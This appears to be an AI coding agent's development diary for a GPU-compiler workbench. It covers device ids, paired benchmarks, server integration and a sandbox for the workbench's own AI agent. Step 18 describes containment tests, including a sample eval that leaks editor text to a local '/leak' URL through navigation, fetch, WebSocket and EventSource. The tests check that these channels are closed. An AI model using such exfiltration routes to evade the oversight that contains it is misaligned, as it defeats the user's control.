### What warrants a second pair of eyes

- Security (guide §30.2) is in `S/src/security.ts`: Host allow-list (`bad_host`), Origin check with `null` refused
  (`bad_origin`), `X-Kiln-Token` compared with `timingSafeEqual` on every non-GET (`bad_token`), JSON content type
  (415). These hold against a DNS-rebinding page and a cross-origin form post.
- `X-Kiln-Proposer` is self-declared, and `POST /jobs/:id/approve` does not look at it: any holder of the session
  token can approve. Today the agent runs inside the page, so "agents cannot approve" is a property of the page's
  agent tools, not of the server. It becomes enforceable when the agent gets its own credential (Phase 7 sandbox).
- The agent budget (600 executor seconds per rolling 24 h) is summed from `jobs.executor_ms`, a column beyond §30.7.

### What should be done in the future

- Page integration (part 2): `connectServer` in `wb.js`, `records.list`/`add`/`forget`, SSE refresh, a Jobs view, a
  CUDA device per server executor, `X-Kiln-Token` on the live `CudaDevice`, and one host convention for device ids
  (server: SSH destination or host name; page: runner URL or `"import"`).

### Code review instructions

- Start at `packages/evidence/src/protocol.ts` and its test, then `S/src/jobs.ts` (search `checkSamples`,
  `repetitionOrder`), then `S/src/security.ts`.
- `pnpm test && pnpm --filter @kiln/server typecheck`.

### Technical details

- Server diary: `reference/05-phase5-server-diary.md` (Steps 1–6, deviations from the guide, what the page
  integration needs). Its mentions of `protocol.ts` and `checkOutputs` describe the code before this step.
- Screenshot: `various/screens/p5-served-by-server-1600.png`.

## Step 12: The vault report, and one device id per CUDA GPU whatever the route

I wrote and pushed the first project report to the vault, covering Phases 0–5a. While the Phase 4 UI worker ran, I
settled the device-id question that the server review left open (Step 11, "What should be done in the future").
The page fingerprinted a CUDA GPU with the runner's URL (or `"import"`) as its host. The server used the SSH
destination or its own host name. The same GPU therefore got a different device id by each route, so its records
could never pool.

### Prompt Context

**User prompt (verbatim):** see Step 1 (the vault report instruction is part of the second request).

**Assistant interpretation:** Publish a report at this milestone; make a GPU's evidence id independent of how it
was reached before Phase 5b connects page and server.

**Inferred user intent:** Records from one GPU pool, whether a measurement came from the page, a server job or an
imported results file.

**Commit (code):** recorded in the changelog entry for this step.

### What I did

- Vault: `Projects/2026/10/19/PROJECT REPORT - Kiln - Measurements That Say What Ran - …md` with six screenshots in
  `_assets/kiln-unified-workbench/`; commit `534ff7f` "Report: Kiln — measurements that say what ran (KILN-001
  phases 0–5a)", pushed to `origin/main`.
- Runner: `device_info` adds `hostname` (`socket.gethostname()`), the machine's own name.
- `@kiln/evidence`: `cudaDevice(report, fallbackHost)` → `{id, name, fingerprint}`. The fingerprint is the report's
  scalar fields; `host` is added only when the report has no `hostname` (runners older than this step).
- Server `cudaIdentity` and the page's `CudaDevice.adopt` both call `cudaDevice`; their two copies of the
  fingerprint rule are gone.
- `CudaDevice.runKernels` sends `X-Kiln-Token` in live mode: the runner's serve mode refuses `POST /api/run`
  without it since Phase 5a, so live CUDA runs from the served page were broken until now.
- `sessionToken(doc)` lives in Kiln's `devices.js`; `server-client.js` imports and re-exports it instead of keeping
  its own `serverToken`.

### Why

- The route is not a property of the GPU. The machine's host name and, with nvidia-smi, the GPU's UUID are, and the
  runner already reports the UUID. Two GPUs of one model on one host still differ by UUID.

### What worked

- `pnpm test`: evidence 122 (3 new `cudaDevice` tests: three routes give one id; the fallback host; two UUIDs on one
  host), Kiln 9, server 49, workbench 2. Server typecheck clean. `python3 -I -m py_compile runner/kiln_runner.py`.

### What didn't work

- The first test name, `'falls back to the caller's host …'`, closed its string at the apostrophe; renamed.

### What warrants a second pair of eyes

- Every CUDA device id changes once: old records carry `host: <route>`, new ones `hostname: <machine>`. No CUDA
  records exist yet outside tests, so nothing is orphaned today.
- The live-mode token fix is untested against a real runner; the server-side token check it satisfies is tested in
  the runner diff of Phase 5a.

### Code review instructions

- `cudaDevice` at the end of `packages/evidence/src/identity.ts` and its tests; `cudaIdentity` in
  `apps/server/src/devices.ts`; `adopt` and `runKernels` in `packages/kiln/src/std/devices.js`.

## Step 13: Phase 6, part 1 — paired runs in Kiln, and predicates that can say "not yet"

While the Phase 4 UI worker had the workbench's files, I built the Kiln side of Phase 6: `measurePaired`, which
compiles one kernel under two schedules and measures both in one protocol run so their records share a `pairId`.
`ev.ratio` already had a paired path; nothing had produced pairs until now.

Writing its test exposed a defect in how hypotheses read intervals. On the same samples stored without a pair id,
W-05's claim (`r.hi < 0.5`) came out **refuted**, from an interval of `[0.133, 1.2]` around a median of 0.4. That
interval does not contradict the claim; it is too wide to confirm it. `verdict` turned a predicate's `null` into
`false`, so a predicate had no way to say "undecided". Now `null` and `undefined` are undecided, and two helpers
make interval claims three-valued.

### Prompt Context

**User prompt (verbatim):** see Step 1.

**Assistant interpretation:** Continue the plan (guide §35, Phase 6) on files the Phase 4 worker is not editing.

**Inferred user intent:** A comparison that holds on a GPU whose clock changes between repetitions.

**Commit (code):** recorded in the changelog entry for this step.

### What I did

- `K/src/std/tune.js`:
  - `kernelPinPolicy(pins)`: the Knobs view's per-kernel pin policy, now in Kiln. `wb.js` still has its own inline
    copy, to be replaced once the worker is done with `wb.js`.
  - `measurePaired({pipeline, graph, params, device, store, identity, rows})`:
    - compiles once per row with that kernel pinned;
    - refuses a row the compile cannot honour, and two sides that are one schedule;
    - runs all sides in one `measureKernels` call (or `runKernel` each on the simulator);
    - stores records with one shared `pairId`.
- `@kiln/evidence` `verdict`: a predicate returning `null` or `undefined` leaves its row undecided. New helpers:
  - `below(r, bound)` / `above(r, bound)` return `true` when `[r.lo, r.hi]` is wholly on the claimed side, `false`
    when it is wholly on the other side, and `null` when it straddles the bound.
- Both helpers and `measurePaired` are exported in `std`.
- Presets:
  - W-05 predicts `std.evidence.below(r, 0.5)`.
  - W-19 checks `time / model` as an interval within [0.75, 1.25], three-valued.
- `K/test/paired.mjs` (15 checks). A fake GPU scales every sample of a repetition by a clock factor
  (1, 3, 1, 1, 3, 1, 3):
  - the paired ratio is exactly 0.4 with a zero-width interval, and the hypothesis is supported;
  - the same samples unpaired give a ratio of medians with an interval of [0.133, 1.200], and the hypothesis stays
    open;
  - the three refusals above;
  - on the simulator the paired ratio has zero width and is heuristic.
- Guide §28 "as built" paragraph for paired runs; guide §29.1 explains three-valued predicates; §29.3 pseudocode
  updated.

### Why

- One protocol run is the only way both sides see the same clock state; section 7.3 of the vault report measured
  3× swings between separately run measurements on the M1 Pro.
- Pairing in `ev.ratio` is by repetition index. That is sound only because a record with a failed repetition is
  invalid and never decisive (`makeRecord`: "small n: k of r repetitions completed").
- "Refuted" must mean a clean counterexample (§29.3). A two-valued test on an interval bound cannot distinguish
  "wholly on the wrong side" from "too wide to tell".

### What worked

- `pnpm test`: evidence 125 (3 new verdict tests), Kiln 10 files (paired.mjs added), server 49, workbench 2.
- The probe: W-05 is open before measuring the thread schedule and supported after; W-19 is supported fused and
  unfused on the simulator.

### What didn't work

- The first test run: `TypeError: ev.ratio is not a function`, because `evidenceContext` returns `{ev, support}`.

### What I learned

- `canonRow` drops default knobs, so the fork's thread option reads `TPB=64`, not `MAP=thread,TPB=64`. The pins
  match either form.

### What warrants a second pair of eyes

- W-25's predicates (`rho >= 0.9`, `regret <= 1.1`) are still two-valued, over point values without intervals.
  That is correct while ρ and regret carry no interval.
- `measurePaired` compiles each side with the caller's pipeline, so the caller's own kernel pins sit behind the
  side's pin. A user pin on a *different* kernel still applies to both sides, which is what a comparison of one
  kernel needs.

### What should be done in the future

- The Compare panel in Perf (two rows of a fork → `measurePaired` → the ratio with its interval), and `wb.js`
  using `kernelPinPolicy`.
- The Phase 6 done-condition on this Mac's GPU: a paired WebGPU comparison of two RMSNorm schedules judging W-05.

### Code review instructions

- `measurePaired` and `kernelPinPolicy` in `packages/kiln/src/std/tune.js`; `below`/`above` and the `null` branch
  in `packages/evidence/src/verdict.ts`; `node packages/kiln/test/paired.mjs`.

## Step 14: Phase 6's done-condition on this Mac's GPU

The guide's Phase 6 done-condition is a paired comparison of two RMSNorm schedules on this Mac's GPU that reports
a ratio with an interval, and W-05's hypothesis judged from it. `apps/workbench/test/paired-webgpu.mjs`
(`pnpm --filter @kiln/workbench test:paired`) does that in headless Chrome. It passes, so the Kiln side of Phase 6
is done; the Compare panel remains.

### Prompt Context

**User prompt (verbatim):** see Step 1.

**Assistant interpretation:** Check the Phase 6 done-condition on real hardware with a script that does not depend
on the UI the Phase 4 worker is still editing.

**Inferred user intent:** Evidence from the GPU, not only from the fake device of `paired.mjs`.

**Commit (code):** recorded in the changelog entry for this step.

### What I did

- Wrote `W/test/paired-webgpu.mjs`, and added `test:paired` to `W/package.json`; the default `test` skips it, like
  `webgpu.mjs`. The script:
  - loads W-05 on the `webgpu` device;
  - takes the thread option with the lowest model score and the compiled row schedule;
  - calls `std.measurePaired`;
  - reads `ev.ratio` and evaluates the hypotheses before and after.

### What worked

```text
device webgpu:webgpu-apple-metal-3-2167faf0 · pair ce14c8a9…
  TPB=64                          samples 26502 26534 26573 26562 26491 26671 26475 µs · positions 1110010
  MAP=row,TPB=1024,STAGE=reused   samples 474 217 210 192 185 223 190 µs · positions 0001101
  ratio MAP=row,TPB=1024,STAGE=reused / TPB=64 = 0.0079 [0.0072, 0.0083] n=7 · paired ratio b/a over 7 repetitions;
  95 % bootstrap CI over repetitions · derived
W-05's hypothesis: open before, supported after · all paired webgpu checks pass in 6.2 s
```

### What I learned

- The thread schedule of a 4096-wide row reduction takes 26.5 ms on the M1 Pro: 1024 threads each walk a row
  serially. The row schedule's first repetition (474 µs) shows the clock-state effect of Step 10, and the paired
  ratio absorbs it because the thread side of that repetition ran in the same state.
- The positions (`1110010` and `0001101`) are complementary in every repetition, as the seeded order requires.

### What should be done in the future

- The Compare panel (Perf), which calls the same `measurePaired` from the UI.

## Step 15: Phase 4, part 3 — review and commit the Hypotheses view and the notes cards

The Phase 4 UI worker finished, with its own diary (`reference/06-phase4-ui-diary.md`, Steps 1–3). It added:

- `wb.hypotheses`;
- the Hypotheses view;
- live cards from ```` ```hypothesis <id> ```` fences in the notes;
- `lab:hypothesis?id=`;
- W-05's "Pin MAP=thread and measure" link.

I reviewed the screenshots and the diff and made one fix from its open-issues list. With this, Phase 4 is complete.

### Prompt Context

**User prompt (verbatim):** see Step 1.

**Assistant interpretation:** Review the worker's Phase 4 UI, fix what its receipt flagged where the fix is small,
commit.

**Inferred user intent:** A claim about performance visible next to the prose that motivates it, with its verdict
changing as evidence arrives.

**Commit (code):** recorded in the changelog entry for this step.

### What I did

- Read the screenshots `p4-W-05-supported-light-1600.png`, `p4-W-25-swept-light-1600.png` and
  `p4-notes-card-phone-dark-390.png`. The card shows:
  - the claim;
  - the predicate's source;
  - the rows as value cells;
  - a per-row "holds / fails / undecided" judgement;
  - the alternatives, the scope, and the support count, which links to the Evidence view.
- Read the diff:
  - `wb.hypotheses` is a getter cached on the compile version, the store version and the evidence id;
  - `links.js` gains one case;
  - there is a one-time layout migration modelled on the Evidence view's.
- Fix: `ev.ratio` labelled the thread side `TPB=128`, because `canonRow` drops the default `MAP=thread`. The
  sides' labels now prepend the filter's knobs that the row leaves out (`sideRow` in `evidence-context.js`), so the
  card reads `a = MAP=thread,TPB=128`.

### What worked

- `pnpm test`: evidence 125, Kiln 10 files, server 49, workbench 2.
- `pnpm build`.
- `node scripts/contrast.mjs`: all pairs pass.
- The worker's `notes.mjs` now fails on a `lab:hypothesis` link or card naming an id the project does not declare;
  all 178 lab links pass.

### What warrants a second pair of eyes

- The receipt lists three open items:
  - `dist/index.html` has no viewport meta, so phone screenshots use `dist/kiln-workbench.html`;
  - `verdict` does not return the fields a predicate read, so a card cannot highlight them;
  - the agent has no tool for verdicts (Phase 7).
- The worker reported "Permission denied" on `/Volumes/SSD/code/kiln` in its shell and worked through the
  `~/code/tulip/experiments/kiln` symlink. The files are the same.

### Code review instructions

- `apps/workbench/src/ui/Hypotheses.jsx` (145 lines), then the `hypotheses` getter in `wb.js` and `Notes.jsx`
  (portals into the rendered notes).

## Step 16: Phase 6, part 2 — the Compare panel

Phase 6's library half (Step 13) gave Kiln `measurePaired`: one protocol run that measures two schedules of one
kernel in every repetition, then `ev.ratio` with an interval over the repetitions. Nothing in the workbench called
it. This step adds `wb.compare(identity, a, b)` and a Compare block in the Perf view's side panel. The block offers
two selects over the kernel's schedules, a "Measure paired on <device>" button, the two sides' medians, `b / a` with
its interval, the estimator, and a one-line reading. On this Mac's GPU, thread `TPB=64` against the compiled
`MAP=row,TPB=1024,STAGE=reused` reads `b / a = 0.0082 ±0.0006, n=7, paired over 7 repetitions` ("b is faster: the
whole interval is below 1").

### Prompt Context

**User prompt (verbatim):** see Step 1.

**Assistant interpretation:** Finish Phase 6 in the UI: a paired comparison a person can start from the kernel they
are looking at.

**Inferred user intent:** Answer "is schedule b faster than a on this GPU?" with an interval that survives the clock
moving between runs.

**Commit (code):** recorded in the changelog entry for this step.

### What I did

- `wb.js`:
  - `compare(identity, a, b, { device })`:
    - probes a real device first;
    - sets `measuring.compare` so the button shows progress;
    - calls `measurePaired` with `rows: [canonRow(a), canonRow(b)]`;
    - stores `wb.comparison = { identity, name, device: evidenceId, a, b, pairId, t }`;
    - logs to Events and recompiles.
  - `pipelineFor` uses the shared `kernelPinPolicy(this.kernelPins)` from `std/tune.js` instead of its own inline
    copy, so a pin in the workbench and a side of a paired run are matched by one rule.
- `Perf.jsx`, `ComparePanel({ x })`:
  - shown only when the selected kernel has a decision with at least two schedules;
  - options are ordered by the cost model (`modelOf(d, knobs).us`);
  - the selects start on the last comparison of this kernel, else on the best other schedule against the compiled
    one;
  - the result is `evidenceContext(...).ev.ratio(identity, { a, b })` for the comparison's device;
  - on a simulator a note says the interval has no width because both sides are deterministic.
- `views.css`: `.compare .lbl` lays out the label and its select on one line; the select shrinks (`min-width: 0`).
- Screenshots `various/screens/p6-compare-webgpu-{light,dark}-1600.png`, taken with the Perf tile maximized and the
  block scrolled into view.

### Why

- Two schedules of one kernel measured in separate runs on an M1 Pro can land on different clock states up to 3×
  apart (Step 9). An unpaired ratio of medians then has an interval wide enough to contain 1 even when one side is
  100× faster (W-05: [0.133, 1.2], Step 13). The paired run removes that: both sides see the same state in each
  repetition.

### What didn't work

- First version ordered options by `o.score`. The shot script threw `TypeError: Cannot read properties of undefined
  (reading 'knobs')`. After an evidence decision, a fork's `score` holds evidence medians, Infinity for every
  unmeasured option, so the filter on finite scores emptied the list. The panel now orders by `modelOf(d, knobs).us`.
- First screenshots: the block was below the fold. `wb.toggleMax()` without an id maximized the Notes tile, not
  Perf. The shot script now finds the tile whose `views` include `perf` in `wb.layout` and maximizes that one.
- The selects reset to the model's order on every mount, so after a comparison they named a different pair than the
  result under them. They now start on the last comparison's rows when it is for this kernel.
- I tried labelling the sides with `r.a` / `r.b` from `ev.ratio`. Those are the records' full rows (every knob,
  e.g. `MAP=thread,COARSEN=1,STAGE=none,BM=0,…,TPB=64`) and wrap to four lines in the side panel. Reverted to
  `canonRow`, which matches the select's text.

### What I learned

- A decision's `options[i].score` changes meaning with the policy that decided it: model microseconds under the
  cost model, evidence medians under the evidence policy. Anything that wants a stable order reads the model
  estimate directly.

### What was tricky to build

- `wb.js` is shared with the Phase 5b worker, which is adding its server section at the same time. I re-read the
  file before each edit and kept my changes to three hunks: the import, `pipelineFor`, and the new `compare`
  section. The worker's `cudaTarget` in `devices.js` is not part of this commit.

### What warrants a second pair of eyes

- The thread side's select text is `TPB=64`: the option's knobs omit the default `MAP=thread`, as everywhere else in
  the workbench. The Hypotheses card spells it out with `sideRow`; the Compare panel does not.
- `wb.comparison` is per page, not persisted. The records are in the store, so `ev.ratio` can rebuild the result for
  any pair after a reload; only the panel's memory of which pair was last compared is lost.

### What should be done in the future

- An agent tool for `wb.compare` (Phase 7).
- A CUDA run of the same comparison needs a real executor and the user's permission to use the remote host.

### Code review instructions

- `ComparePanel` in `apps/workbench/src/ui/Perf.jsx`, then `compare` in `apps/workbench/src/ui/wb.js`.
- Validate: `pnpm test`, `pnpm build`, `node scripts/contrast.mjs`; then open `dist/kiln-workbench.html` in Chrome,
  load W-05, pick WebGPU, Measure, and use Compare in the Perf side panel.

### Technical details

- `pnpm test`: evidence, Kiln (10 files: all passed), server (49 tests), workbench (`notes.mjs`, `presets.mjs`).
- `pnpm build`: `dist/index.html 1216 KB (bundle 1156 KB, 25 presets, 25 with notes)`.
- `node scripts/contrast.mjs`: all pairs pass.
- Run in the screenshot: a `26.59 ms +56/−30 n=7`, b `218 µs +7.6/−16 n=14` (b also has the earlier Measure run's
  records), `b / a = 0.0082 ±0.0006 n=7`.

## Step 17: Phase 5, part 2 — review and commit the page–server integration

The Phase 5b worker finished, with its own diary (`reference/07-phase5b-integration-diary.md`, Steps 1–7). Served by
the Kiln server, the page now does four things:

- it keeps its records on the server, loading the server's and posting its own (`server-sync.js`);
- it offers one CUDA device per server executor;
- it measures on such a device by proposing a job;
- it shows the jobs in a new Jobs view, with a server line above Devices.

The done-condition holds on the development server's fake runner:

- a proposed job went proposed → approved → running → done;
- its record is valid with 7 samples;
- the next W-05 compile decides "by evidence (confirms the model)" where it said "by model" before.

I reviewed the screenshots and the diff, fixed the one issue the receipt assigned to me, and committed only the
worker's changes. The working tree already held my Phase 7 work in the same files.

### Prompt Context

**User prompt (verbatim):** see Step 1.

**Assistant interpretation:** Review the worker's Phase 5b, fix what is small, commit it separately from Phase 7.

**Inferred user intent:** Measurements from a real CUDA box arrive in the page as records with provenance, through a
server that keeps agent-proposed work waiting for the user.

**Commit (code):** recorded in the changelog entry for this step.

### What I did

- Read the screenshots:
  - `p5b-jobs-light-1600.png` shows three jobs:
    - a done user job;
    - a done agent job;
    - a cancelled agent job ("by the agent");
    - the detail panel lists protocol, times, the event log and the record.
  - `p5b-devices-dark-390.png` shows the server line and the server device in the device list.
- The phone shot showed the runner block "A real CUDA GPU · ready" under a server device, as the receipt warned.
  `DevicesView` in `Perf.jsx` now picks `kind === "cuda" && !server` for that block.
- Separated the commit:
  - `wb.js` had 24 hunks, 7 of them the worker's:
    - the imports;
    - the constructor's server fields;
    - the Jobs layout migration;
    - `startServer()` in `start`;
    - the server branch of `measure`;
    - the guard in `importResults`;
    - the server section.
  - I built the worker-only file by undoing my Phase 7 edits on a copy (`scratchpad/wb-theirs.js`). Its diff from
    HEAD contains only those hunks. I staged it with `git hash-object -w` and `git update-index --cacheinfo`, which
    leaves the working file untouched.
  - The same for `build.mjs`: the worker's `jobs` stylesheet line, not my frame bundle.

### Why

- One commit per phase keeps `git log` readable as the build order of the guide. Staging a blob leaves the working
  file, with both changes, as it is.

### What worked

- The worker's validation:
  - `server-e2e.mjs`: 15 checks;
  - `server-sync.mjs`: 26 checks;
  - `pnpm test`: evidence 125, Kiln 10/10, server 60, workbench 3/3.
- I re-ran the tests on the commit itself in a temporary worktree (Technical details).

### What warrants a second pair of eyes

- Tune and Compare refuse server devices ("runs jobs only"). A paired comparison could be one job with both
  schedules.
- A local executor's fingerprint uses the machine name as the host, and imported results use "import". So one GPU
  can still have two device ids when results arrive by both routes.
- Every reconnect re-reads all records; a `since` cursor would bound that.

### Code review instructions

- The `// ---------- server (guide §30) ----------` section of `apps/workbench/src/ui/wb.js`, then
  `apps/workbench/src/server-sync.js` and `apps/workbench/src/ui/Jobs.jsx`.
- `pnpm --filter @kiln/workbench test:server` runs the end-to-end check against `apps/server/test/support/serve-dev.ts`.

### Technical details

- Hunk inventory: `git diff -U0 apps/workbench/src/ui/wb.js`. The worker's hunks were 3, 5, 6, 19, 21 and 22, plus
  the `startServer()` line inside hunk 7.

## Step 18: Phase 7 — the agent's sandbox, held scripts and the model gateway

Phase 7 is done. Agent eval code now runs in a dedicated worker that a sandboxed, opaque-origin iframe starts, and it
reaches the workbench only through one `MessagePort`. The page answers only the calls its scope lists and enforces the
run mode on its own side. A script the agent writes is held until the user presses Run. A page served by the Kiln
server reaches the model through `/api/agent/sample`, which writes one `llm_calls` row per call. The gateway half is
the worker's (`reference/08-phase7-gateway-diary.md`, Steps 1–3); the sandbox, the hold, the shared compile path and
the browser test are mine.

The done-condition holds in Chrome against the development server and a fake model upstream:

- an eval's `fetch` to `/api/jobs/…/approve` fails and approves nothing;
- `localStorage` does not exist in the eval's realm;
- an agent-proposed job is still `proposed` 3 s later;
- the usage endpoint reports two token rows for two model calls, filed under the conversation.

The browser test found one channel the first design left open: the frame could navigate itself and send data in the
URL. Eval code was moved from the frame's document into a worker, which has no document to navigate.

### Prompt Context

**User prompt (verbatim):** see Step 1 (the "Once upload, then implement it…" request).

**Assistant interpretation:** Implement guide Phase 7 (§31) to its done-condition, prove it in a browser, document
the as-built design, and commit my work together with the gateway worker's.

**Inferred user intent:** An agent that can work on the user's compiler and propose GPU jobs without being able to act
with the user's authority, and with its model use counted.

**Commit (code):** recorded in the next checkpoint.

### What I did

- Moved the compile path out of `wb.js` into `apps/workbench/src/compile.js` (`compileScript`, `pipelineFor`,
  `endToEnd`, `hasKernels`, `checkResult`), so the page and the worker compile by the same code. Added
  `EvidenceStore.slice(device)` and `EvidenceStore.fromSlice()` in `packages/kiln/src/std/store.js` to send one
  device's evidence to the worker.
- Split the agent: `agent/encode.js` (summaries, `yaml`, wire format), `agent/inspect.js` (`ir`, `trace`),
  `agent/frame.js` (`startFrame`: the eval's names and its run), `agent/sandbox.js` (`servePort`, `runInFrame`), and
  `agent/agent.js` (conversation loop, `runEval`, `pageCall`, `frameContext`, the handle API).
- Added held scripts: `wb.pending`, `holdScript`, `runScript`, `HeldScriptError`, the Scripts Hold/Run setting, the
  held bar in the Code view (`Ide.jsx`, `.held` in `views.css`).
- Wired the gateway into the page (`main.jsx`): without `window.claude`, a server-served page uses
  `gatewaySample` when `/api/agent/usage` says `ready`. Exposed `window.__kiln.agent` for the browser test.
- Wrote `apps/workbench/test/sandbox.mjs` (36 checks, in `pnpm test`) and `apps/workbench/test/agent-e2e.mjs`
  (20 checks, `pnpm --filter @kiln/workbench test:agent`).
- Found the navigation channel with the first version of `agent-e2e.mjs` (below), then moved eval code into a worker:
  `agent/frame-main.js` became `agent/worker-main.js`, `build.mjs` emits `WORKER_JS`, and `frameDoc()` embeds it as a
  string literal with `<` escaped. The frame's CSP gained `worker-src blob:`.
- Updated `test/ui.mjs`'s agent evals to the async bridge API and moved its `measure` before `editor.edit`.
- Updated guide §30.1, §30.3 and §31 (now §31.1–31.5, as built), `apps/server/README.md`, and
  `agent-guidelines.txt`.
- Screenshots in `various/screens/`: `p7-agent-light-1600.png`, `p7-agent-dark-1600.png`, `p7-agent-dark-390.png`,
  `p7-held-light-1600.png`, `p7-held-dark-390.png`, `p7-jobs-light-1600.png`.

### Why

- **Held scripts.** The guide's §31 sandboxed the eval but not its output. A project script is JavaScript the page
  compiles with the page's authority, so `editor.set(text)` from a sandboxed eval would have run agent-written code
  with full access to the token. The hold closes that path; the worker's own compile keeps the agent informed.
- **One compile path.** `ir`, `trace` and `editor.check` must return live objects and accept predicates, which cannot
  cross a `MessagePort`. The worker compiles the editor's script itself, so it has to compile it exactly as the page
  does, including evidence-decided forks.
- **The worker.** Nothing in the CSP or the sandbox attribute stops a frame from navigating itself, and the test
  showed the navigation request leaving. A worker has no document, and it inherits the frame's CSP for every request
  it can make.

### What worked

- `pnpm test`: evidence 125 tests, kiln 10 files, server 62 tests (13 gateway), workbench 5 files (`gateway.mjs` 33
  checks, `sandbox.mjs` 36 checks). `pnpm build` and `node scripts/contrast.mjs` pass. `test/server-e2e.mjs` passes.
- `node test/agent-e2e.mjs`: 20 of 20. The eval's result in the browser:

  ```yaml
  realm: undefined undefined undefined undefined
  approve: "TypeError: Failed to fetch"
  fetch: TypeError
  webSocket: constructed
  eventSource: constructed
  importScripts: NetworkError
  worker: SecurityError
  navigate: TypeError
  job: proposed
  ran: false
  compiles: true
  ```

  Every attempt was aimed at the fake upstream's `/leak` path, and none arrived. `/api/agent/usage` reported
  `2 calls, 2003 in, 340 out, est 15869`, and the conversation row matched the page's conversation id.
- A runaway eval (`while (true) {}`) left the page answering `Runtime.evaluate` within 5 s; Stop marked the step
  `stopped` and removed the frame, which ends its worker.
- Positive control for the leak check: with `connect-src *` appended to `FRAME_CSP`, the test failed with
  `got /leak?fetch /leak?sse /leak?ws`. With the CSP restored it passed again.

### What didn't work

- The first `agent-e2e.mjs` run failed one check because the YAML encoder quotes the string `"null"`:
  `windowOpen: "null"` did not match `/windowOpen: null/`. The regex was wrong, not the behaviour.
- The first design ran eval code in the frame's document. An eval doing
  `location.href = "http://127.0.0.1:<port>/leak?script=" + encodeURIComponent((await editor.get()).slice(0, 24))`
  produced, at the fake server:
  `the navigation's request reached the network: /leak?script=%2F**%20W-05%20RMSNorm%2C%20fused%20`.
  Detecting the frame's second `load` event ended the eval but could not stop the request, so I replaced the
  detection with the worker and deleted it.
- `node test/ui.mjs` cannot run here: `Error: Cannot find module 'playwright'`. Its seven updated agent evals were
  run instead through the `MessageChannel` transport in Node; all returned `ok`, with the table and code parts
  present and the edit held.

### What I learned

- An exception name does not prove that a request stayed in. With `connect-src *`, `fetch` from the opaque origin
  still threw `TypeError`, because the response could not be read, but the request had reached the host. Only the
  receiving side can show that nothing left.
- A worker created from a `blob:` URL inherits its creator's CSP in Chrome: `importScripts` from another host fails
  with `NetworkError` and `new Worker(url)` with `SecurityError`. `WebSocket` and `EventSource` construct without
  throwing and fail asynchronously.
- Node's HTTP server reports a WebSocket handshake as an `upgrade` event, not a `request`; a leak check that listens
  only for requests would miss it.

### What was tricky to build

- The worker's compile must equal the page's. Params, pins, kernel pins, the target and the device's evidence all
  feed the compile, so `ctx` carries each, and a page call that changes any of them returns a new `ctx`.
  `editor.check` in the worker is compared to the page's `runSummary` in `sandbox.mjs`, including an evidence decision
  after measuring.
- Some calls are made while a script is held, and their results would describe a compile that the editor no longer
  shows. Each such call refuses with `HeldScriptError` rather than answering about the stale compile.
- Embedding a 1.5 MB bundle in `srcdoc`: a `<script>` element ends at `</script` and changes parsing state at `<!--`.
  Encoding the bundle as a JSON string literal with every `<` written as `<` keeps every byte of it out of the
  HTML parser's way and preserves the code exactly.

### What warrants a second pair of eyes

- `pageCall` and the read-only wrappers in `agent.js`: the page side is the only enforcement of the run mode.
- `HELD` and the list of calls it blocks: a call missing from the list would answer about a stale compile.
- The gateway (worker's code): no upstream timeout and no concurrency cap, so a stuck model call holds its request
  until the page stops it; `apiKey` is a plain config field (never logged or returned, but held in memory as text).
- The worker is started per eval and parses the whole bundle each time; its start-up cost was not measured apart
  from the eval's.

### What should be done in the future

- Port `test/ui.mjs` from Playwright to `scripts/shoot.mjs` (already listed), then run its agent section.
- An upstream timeout and a concurrency cap for `/api/agent/sample`.
- Measure the per-eval worker start-up cost; if it matters, keep one worker per answer instead of per eval.

### Code review instructions

- Start at `apps/workbench/src/agent/sandbox.js` (`frameDoc`, `runInFrame`), then `agent/frame.js` (`runEval`),
  then `pageCall`, `frameContext` and `HELD` in `agent/agent.js`.
- Validate: `pnpm test`; `pnpm --filter @kiln/workbench test:agent` (Chrome); `pnpm --filter @kiln/workbench
  test:server`.

### Technical details

- CSP: `default-src 'none'; script-src 'unsafe-inline' 'unsafe-eval'; worker-src blob:`.
- Messages: `{t:"kiln-port"}` (page → frame, with the port), `{t:"eval", code, api, ctx}`, `{t:"call", id, path,
  args}`, `{t:"ret", id, ok, value, ctx?}` or `{t:"ret", id, ok:false, error:{name, message}}`,
  `{t:"done", ok, out, lang, logs}`.
- `agent-e2e.mjs` env for the development server: `KILN_MODEL=fake-model`,
  `KILN_MODEL_URL=http://127.0.0.1:<fake>/v1/messages`, `ANTHROPIC_API_KEY=<random test value>`.
